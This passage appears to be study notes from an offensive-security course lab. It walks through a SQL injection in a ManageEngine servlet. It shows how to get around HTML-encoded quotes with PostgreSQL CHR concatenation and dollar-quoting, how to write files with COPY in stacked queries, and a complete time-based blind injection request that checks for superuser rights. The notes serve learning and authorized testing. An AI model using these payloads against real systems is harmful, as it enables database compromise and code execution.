## Special Character Encoding
As it stands, the ability to use quotes is highly limited.
This is because when we try to send a payload with quotes, to the vulnerable URL, and analyze the log file. We see the following:

This time the error is different.
It turns out, special characters are HTML-encoded before they are sent to the database for further processing.
This means we cannot use quotes in our queries, which creates a caveat to solve.

## Using Concatenation
One of the ways in which we can bypass the quotes restriction is to use the [_CHR_](https://www.postgresql.org/docs/9.1/functions-string.html) and _concatenation_ syntax.
We can select individual characters using their code points, and concatenate them together using the double pipe (||) operator.

```postgresql
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
-- this will give the output of "AWAE"
```

This does give us a solution, but not a stable one, as we cannot use this to execute any functions such as the COPY function which is necessary for code execution:

The _CHR_ function can be very helpful while dealing with non-printable characters, however it does not help with our quote restriction.

## Dollar Dollar
The postgres syntax also supports of dollar-quoted string constants.
Their purpose is to make it easier to read statements that contain strings with literal quotes.
Essentially, two dollar characters, can be used as a quote.
As a result, all of these statements give the same result:

```postgresql
SELECT 'print this'
SELECT $$print this$$
SELECT $TAG$print this$TAG$
```

This lets us fully bypass the quote restriction, and lets us form statements like:
```postgresql
CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
-- this will create a file called test.txt with the text "offsec"
```

## Creating The Payload
Now that we can bypass the quotes restriction and are able to execute arbitrary stacked queries, it would be helpful to verify what database privileges the vulnerable application is running with.
Remembering that we have to use a time-based blind injection, we will work on the following query that returns true if the user is DBA:

```postgresql
SELECT current_setting('is_superuser');
```

Thus, we will use the following request to trigger the database sleep function if our database user is indeed DBA:

```http
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(5)+end;--+
```

Executing the request, we get a response back delayed by 5 seconds, indicating that we indeed are the DBA user:
